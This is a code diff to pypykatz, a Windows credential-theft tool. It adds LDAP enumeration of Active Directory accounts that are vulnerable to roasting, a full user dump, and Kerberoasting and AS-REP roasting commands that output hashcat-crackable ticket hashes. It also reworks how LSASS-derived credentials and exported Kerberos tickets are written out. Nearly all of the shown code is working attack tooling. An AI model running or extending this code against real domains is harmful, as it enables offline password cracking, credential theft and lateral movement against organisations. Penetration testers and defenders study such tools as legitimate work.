@@ -65,6 +65,32 @@ def main():
 	live_subparser_dpapi_group.add_argument('--cred', help= 'credential file')
 	live_subparser_dpapi_group.add_argument('--mkf', help= 'masterkey file')
 	
+	live_subparser_ldap_group = live_subparsers.add_parser('ldap', help='LDAP (live) related commands')
+	live_subparser_ldap_group.add_argument('-c','--credential', help= 'Credential to be used, if omitted it will use teh credentials of the current user. If specified, it will try to impersonate the user. (requires the the target user has a session on the local computer)')
+	live_subparser_ldap_group.add_argument('--dc-ip', help= 'IP address or hostname of the LDAP server. Optional. If omitted will use registry to check for the DC.')
+	live_subparser_ldap_group.add_argument('cmd', choices=['spn', 'asrep','dump','custom'])
+	live_subparser_ldap_group.add_argument('-q','--query', help= 'LDAP query to execute')
+	live_subparser_ldap_group.add_argument('-o','--out-file', help= 'File to stroe results in')
+	live_subparser_ldap_group.add_argument('-a','--attrs', action='append', help='DUMP and CUSTOM mode only. LDAP attributes to display. Can be stacked')
+	live_subparser_ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
+	
+	live_subparser_kerberos_group = live_subparsers.add_parser('kerberos', help='Kerberos (live) related commands')
+	live_subparser_kerberos_group.add_argument('-c','--credential', help= 'Credential to be used, if omitted it will use teh credentials of the current user. If specified, it will try to impersonate the user. (requires the the target user has a session on the local computer)')
+	live_subparser_kerberos_group.add_argument('--dc-ip', help= 'IP address or hostname of the LDAP server. Optional. If omitted will use registry to check for the DC.')
+	live_subparser_kerberos_group.add_argument('cmd', choices=['spnroast', 'asreproast'])
+	live_subparser_kerberos_group.add_argument('-o','--out-file', help= 'File to stroe results in')
+	live_subparser_kerberos_group.add_argument('-t','--target-file', help= 'List of target users to roast. One user per line. Format: asreproast->username spnroast->domain/username')
+	live_subparser_kerberos_group.add_argument('-u','--target-user', action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
+	live_subparser_kerberos_group.add_argument('-r','--realm', help= 'Kerberos Realm.')
+	
+	ldap_group = subparsers.add_parser('ldap', help='LDAP (live) related commands')
+	ldap_group.add_argument('credential', help= 'Credential to be used')
+	ldap_group.add_argument('cmd', choices=['spn', 'asrep','dump','custom'])
+	ldap_group.add_argument('-q','--query', help= 'LDAP query to execute')
+	ldap_group.add_argument('-o','--out-file', help= 'File to stroe results in')
+	ldap_group.add_argument('-a','--attrs', action='append', help='DUMP and CUSTOM mode only. LDAP attributes to display. Can be stacked')
+	ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
+	
 	dpapi_group = subparsers.add_parser('dpapi', help='DPAPI (offline) related commands')
 	dpapi_group.add_argument('cmd', choices=['masterkey', 'credential', 'vault'])
 	dpapi_group.add_argument('-r', '--method_registry', action='store_true', help= 'Getting prekeys from registry hive files. Using this you will need to also supply system, security and optionally sam switches')
@@ -236,8 +262,320 @@ def main():
 					
 				if len(dpapi.masterkeys) == 0:
 					print('Failed to decrypt masterkey')
+					
+		elif args.module == 'ldap':
+			from msldap.core import MSLDAPCredential, MSLDAPTarget, MSLDAPConnection
+			from msldap.ldap_objects import MSADUser
+			from msldap import logger as msldaplogger
+			from pypykatz.commons.winapi.machine import LiveMachine
 			
-	###### DPAPI offline		
+			machine = LiveMachine()
+		
+			if args.credential:
+				creds = MSLDAPCredential.from_connection_string(args.credential)
+			else:
+				creds = MSLDAPCredential.get_dummy_sspi()
+			
+			if args.dc_ip:
+				target = MSLDAPTarget(args.dc_ip)
+			else:
+				target = MSLDAPTarget(machine.get_domain())
+				
+			connection = MSLDAPConnection(creds, target)
+			connection.connect()
+			
+			try:
+				adinfo = connection.get_ad_info()
+				domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
+			except Exception as e:
+				logging.warning('[LDAP] Failed to get domain name from LDAP server. This is not normal, but happens. Reason: %s' % e)
+				domain = machine.get_domain()
+			
+			if args.cmd == 'spn':
+				logging.debug('Enumerating SPN user accounts...')
+				cnt = 0
+				if args.out_file:
+					with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
+						for user in connection.get_all_service_user_objects():
+							cnt += 1
+							f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+				
+				else:
+					print('[+] SPN users')
+					for user in connection.get_all_service_user_objects():
+						cnt += 1
+						print('%s/%s' % (domain, user.sAMAccountName))
+				
+				logging.debug('Enumerated %d SPN user accounts' % cnt)
+				
+			elif args.cmd == 'asrep':
+				logging.debug('Enumerating ASREP user accounts...')
+				ctr = 0
+				if args.out_file:
+					with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
+						for user in connection.get_all_knoreq_user_objects():
+							ctr += 1
+							f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+				else:
+					print('[+] ASREP users')
+					for user in connection.get_all_knoreq_user_objects():
+						ctr += 1
+						print('%s/%s' % (domain, user.sAMAccountName))
+
+				logging.debug('Enumerated %d ASREP user accounts' % ctr)
+				
+			elif args.cmd == 'dump':
+				logging.debug('Enumerating ALL user accounts, this will take some time depending on the size of the domain')
+				ctr = 0
+				attrs = args.attrs if args.attrs is not None else MSADUser.TSV_ATTRS
+				if args.out_file:
+					with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='', encoding ='utf8') as f:
+						writer = csv.writer(f, delimiter = '\t')
+						writer.writerow(attrs)
+						for user in connection.get_all_user_objects():
+							ctr += 1
+							writer.writerow(user.get_row(attrs))
+
+				else:
+					logging.debug('Are you sure about this?')
+					print('[+] Full user dump')
+					print('\t'.join(attrs))
+					for user in connection.get_all_user_objects():
+						ctr += 1
+						print('\t'.join([str(x) for x in user.get_row(attrs)]))
+
+				
+				logging.debug('Enumerated %d user accounts' % ctr)
+				
+			elif args.cmd == 'custom':
+				if not args.filter:
+					raise Exception('Custom LDAP search requires the search filter to be specified!')
+				if not args.attrs:
+					raise Exception('Custom LDAP search requires the attributes to be specified!')
+
+				logging.debug('Perforing search on the AD with the following filter: %s' % args.filter)
+				logging.debug('Search will contain the following attributes: %s' % ','.join(args.attrs))
+				ctr = 0
+
+				if args.out_file:
+					with open(os.path.join(basefolder,basefile+'_ldap_custom.tsv'), 'w', newline='') as f:
+						writer = csv.writer(f, delimiter = '\t')
+						writer.writerow(args.attrs)
+						for obj in connection.pagedsearch(args.filter, args.attrs):
+							ctr += 1
+							writer.writerow([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs])
+
+				else:
+					for obj in connection.pagedsearch(args.filter, args.attrs):
+						ctr += 1
+						print('\t'.join([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs]))
+
+				logging.debug('Custom search yielded %d results!' % ctr)
+				
+				
+		elif args.module == 'kerberos':
+			from winsspi.sspi import KerberoastSSPI
+			from minikerberos.security import TGSTicket2hashcat, APREPRoast
+			from minikerberos.utils import TGTTicket2hashcat
+			from minikerberos.communication import KerberosSocket
+			from minikerberos.common import KerberosTarget
+			from pypykatz.commons.winapi.machine import LiveMachine
+			
+			if not args.target_file and not args.target_user:
+				raise Exception('No targets loaded! Either -u or -t MUST be specified!')
+			
+			machine = LiveMachine()
+			
+			realm = args.realm
+			if not args.realm:
+				realm = machine.get_domain()
+			
+			if args.cmd in ['spnroast','asreproast']:
+				targets = []
+				if args.target_file:
+					with open(args.target_file, 'r') as f:
+						for line in f:
+							line = line.strip()
+							domain = None
+							username = None
+							if line.find('/') != -1:
+								#we take for granted that usernames do not have the char / in them!
+								domain, username = line.split('/')
+							else:
+								username = line
+
+							if args.realm:
+								domain = args.realm
+							else:
+								if domain is None:
+									raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+							
+							target = KerberosTarget()
+							target.username = username
+							target.domain = domain
+							targets.append(target)
+							
+				if args.target_user:
+					for user in args.target_user:
+						domain = None
+						username = None
+						if user.find('/') != -1:
+							#we take for granted that usernames do not have the char / in them!
+							domain, username = user.split('/')
+						else:
+							username = user
+
+						if args.realm:
+							domain = args.realm
+						else:
+							if domain is None:
+								raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+						target = KerberosTarget()
+						target.username = username
+						target.domain = domain
+						targets.append(target)
+				
+				results = []
+				errors = []
+				if args.cmd  == 'spnroast':
+					for spn_name in targets:
+						ksspi = KerberoastSSPI()
+						try:
+							ticket = ksspi.get_ticket_for_spn(spn_name.get_formatted_pname())
+						except Exception as e:
+							errors.append((spn_name, e))
+							continue
+						results.append(TGSTicket2hashcat(ticket))
+					
+				elif args.cmd == 'asreproast':
+					dcip = args.dc_ip
+					if args.dc_ip is None:
+						dcip = machine.get_domain()
+					ks = KerberosSocket( dcip )
+					ar = APREPRoast(ks)
+					results = ar.run(targets)
+
+					
+				if args.out_file:
+					with open(args.out_file, 'w') as f:
+						for thash in results:
+							f.write(thash + '\r\n')
+
+				else:
+					for thash in results:
+						print(thash)
+				
+				for err in errors:
+					print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
+
+				logging.info('SSPI based Kerberoast complete')
+			
+			
+	###### DPAPI offline				
+	elif args.command == 'ldap':
+		from msldap.core import MSLDAPCredential, MSLDAPTarget, MSLDAPConnection
+		from msldap.ldap_objects import MSADUser
+		from msldap import logger as msldaplogger
+
+	
+		if not args.credential:
+			raise Exception('You must provide credentials when using ldap in platform independent mode.')
+			
+		creds = MSLDAPCredential.from_connection_string(args.credential)
+		target = MSLDAPTarget.from_connection_string(args.credential)
+			
+		connection = MSLDAPConnection(creds, target)
+		connection.connect()
+		
+		try:
+			adinfo = connection.get_ad_info()
+			domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
+		except Exception as e:
+			logging.warning('[LDAP] Failed to get domain name from LDAP server. This is not normal, but happens. Reason: %s' % e)
+			domain = machine.get_domain()
+		
+		if args.cmd == 'spn':
+			logging.debug('Enumerating SPN user accounts...')
+			cnt = 0
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
+					for user in connection.get_all_service_user_objects():
+						cnt += 1
+						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+			
+			else:
+				print('[+] SPN users')
+				for user in connection.get_all_service_user_objects():
+					cnt += 1
+					print('%s/%s' % (domain, user.sAMAccountName))
+			
+			logging.debug('Enumerated %d SPN user accounts' % cnt)
+			
+		elif args.cmd == 'asrep':
+			logging.debug('Enumerating ASREP user accounts...')
+			ctr = 0
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
+					for user in connection.get_all_knoreq_user_objects():
+						ctr += 1
+						f.write('%s/%s\r\n' % (domain, user.sAMAccountName))
+			else:
+				print('[+] ASREP users')
+				for user in connection.get_all_knoreq_user_objects():
+					ctr += 1
+					print('%s/%s' % (domain, user.sAMAccountName))
+    
+			logging.debug('Enumerated %d ASREP user accounts' % ctr)
+			
+		elif args.cmd == 'dump':
+			logging.debug('Enumerating ALL user accounts, this will take some time depending on the size of the domain')
+			ctr = 0
+			attrs = args.attrs if args.attrs is not None else MSADUser.TSV_ATTRS
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='', encoding ='utf8') as f:
+					writer = csv.writer(f, delimiter = '\t')
+					writer.writerow(attrs)
+					for user in connection.get_all_user_objects():
+						ctr += 1
+						writer.writerow(user.get_row(attrs))
+    
+			else:
+				logging.debug('Are you sure about this?')
+				print('[+] Full user dump')
+				print('\t'.join(attrs))
+				for user in connection.get_all_user_objects():
+					ctr += 1
+					print('\t'.join([str(x) for x in user.get_row(attrs)]))
+    
+			
+			logging.debug('Enumerated %d user accounts' % ctr)
+			
+		elif args.cmd == 'custom':
+			if not args.filter:
+				raise Exception('Custom LDAP search requires the search filter to be specified!')
+			if not args.attrs:
+				raise Exception('Custom LDAP search requires the attributes to be specified!')
+    
+			logging.debug('Perforing search on the AD with the following filter: %s' % args.filter)
+			logging.debug('Search will contain the following attributes: %s' % ','.join(args.attrs))
+			ctr = 0
+    
+			if args.out_file:
+				with open(os.path.join(basefolder,basefile+'_ldap_custom.tsv'), 'w', newline='') as f:
+					writer = csv.writer(f, delimiter = '\t')
+					writer.writerow(args.attrs)
+					for obj in connection.pagedsearch(args.filter, args.attrs):
+						ctr += 1
+						writer.writerow([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs])
+    
+			else:
+				for obj in connection.pagedsearch(args.filter, args.attrs):
+					ctr += 1
+					print('\t'.join([str(obj['attributes'].get(x, 'N/A')) for x in args.attrs]))
+    
+			logging.debug('Custom search yielded %d results!' % ctr)
+
+
 	elif args.command == 'dpapi':
 		from pypykatz.dpapi.dpapi import DPAPI
 		
@@ -355,7 +693,7 @@ def main():
 					raise Exception('VCRED decryption requires a key OR a VPOL file')
 
 
-	###### Rekall
+	###### GPPassword
 	elif args.command == 'gppassword':
 		from pypykatz.utils.gppassword.gppassword import GPPassword
 		gp = GPPassword()
@@ -420,70 +758,73 @@ def main():
 		else:
 			print(str(po))
 			
-
-	if args.outfile and args.json:
-		with open(args.outfile, 'w') as f:
-			json.dump(results, f, cls = UniversalEncoder, indent=4, sort_keys=True)
-	
-	elif args.outfile:
-		with open(args.outfile, 'w') as f:
+	elif args.command in ['minidump', 'rekall', 'live']:
+		if args.command == 'live':
+			if args.cmd != 'lsa':
+				return
+		if args.outfile and args.json:
+			with open(args.outfile, 'w') as f:
+				json.dump(results, f, cls = UniversalEncoder, indent=4, sort_keys=True)
+		
+		elif args.outfile:
+			with open(args.outfile, 'w') as f:
+				for result in results:
+					f.write('FILE: ======== %s =======\n' % result)
+					
+					for luid in results[result].logon_sessions:
+						f.write('\n'+str(results[result].logon_sessions[luid]))
+					
+					if len(results[result].orphaned_creds) > 0:
+						f.write('\n== Orphaned credentials ==\n')
+						for cred in results[result].orphaned_creds:
+							f.write(str(cred))
+					
+				if len(files_with_error) > 0:
+					f.write('\n== Failed to parse these files:\n')
+					for filename in files_with_error:
+						f.write('%s\n' % filename)
+				
+		elif args.json:
+			print(json.dumps(results, cls = UniversalEncoder, indent=4, sort_keys=True))
+		
+		else:
 			for result in results:
-				f.write('FILE: ======== %s =======\n' % result)
-				
-				for luid in results[result].logon_sessions:
-					f.write('\n'+str(results[result].logon_sessions[luid]))
-				
-				if len(results[result].orphaned_creds) > 0:
-					f.write('\n== Orphaned credentials ==\n')
-					for cred in results[result].orphaned_creds:
-						f.write(str(cred))
-				
-			if len(files_with_error) > 0:
-				f.write('\n== Failed to parse these files:\n')
-				for filename in files_with_error:
-					f.write('%s\n' % filename)
-			
-	elif args.json:
-		print(json.dumps(results, cls = UniversalEncoder, indent=4, sort_keys=True))
-	
-	else:
-		for result in results:
-			print('FILE: ======== %s =======' % result)	
-			if isinstance(results[result], str):
-				print(results[result])
-			else:
-				for luid in results[result].logon_sessions:
-					print(str(results[result].logon_sessions[luid]))
-						
-				if len(results[result].orphaned_creds) > 0:
-					print('== Orphaned credentials ==')
-					for cred in results[result].orphaned_creds:
-						print(str(cred))
-						
-				
+				print('FILE: ======== %s =======' % result)	
+				if isinstance(results[result], str):
+					print(results[result])
+				else:
+					for luid in results[result].logon_sessions:
+						print(str(results[result].logon_sessions[luid]))
+							
+					if len(results[result].orphaned_creds) > 0:
+						print('== Orphaned credentials ==')
+						for cred in results[result].orphaned_creds:
+							print(str(cred))
+							
+					
 
-		if len(files_with_error) > 0:			
-			print('\n==== Parsing errors:')
-			for filename in files_with_error:
-				print(filename)
-	
-	
-	if args.kerberos_dir:
-		dir = os.path.abspath(args.kerberos_dir)
-		logging.info('Writing kerberos tickets to %s' % dir)
-		for filename in results:
-			base_filename = ntpath.basename(filename)
-			ccache_filename = '%s_%s.ccache' % (base_filename, os.urandom(4).hex()) #to avoid collisions
-			results[filename].kerberos_ccache.to_file(os.path.join(dir, ccache_filename))
-			for luid in results[filename].logon_sessions:
-				for kcred in results[filename].logon_sessions[luid].kerberos_creds:
-					for ticket in kcred.tickets:
-						ticket.to_kirbi(dir)
-						
-			for cred in results[filename].orphaned_creds:
-				if cred.credtype == 'kerberos':
-					for ticket in cred.tickets:
-						ticket.to_kirbi(dir)
+			if len(files_with_error) > 0:			
+				print('\n==== Parsing errors:')
+				for filename in files_with_error:
+					print(filename)
+		
+		
+		if args.kerberos_dir:
+			dir = os.path.abspath(args.kerberos_dir)
+			logging.info('Writing kerberos tickets to %s' % dir)
+			for filename in results:
+				base_filename = ntpath.basename(filename)
+				ccache_filename = '%s_%s.ccache' % (base_filename, os.urandom(4).hex()) #to avoid collisions
+				results[filename].kerberos_ccache.to_file(os.path.join(dir, ccache_filename))
+				for luid in results[filename].logon_sessions:
+					for kcred in results[filename].logon_sessions[luid].kerberos_creds:
+						for ticket in kcred.tickets:
+							ticket.to_kirbi(dir)
+							
+				for cred in results[filename].orphaned_creds:
+					if cred.credtype == 'kerberos':
+						for ticket in cred.tickets:
+							ticket.to_kirbi(dir)
 	
 	
 
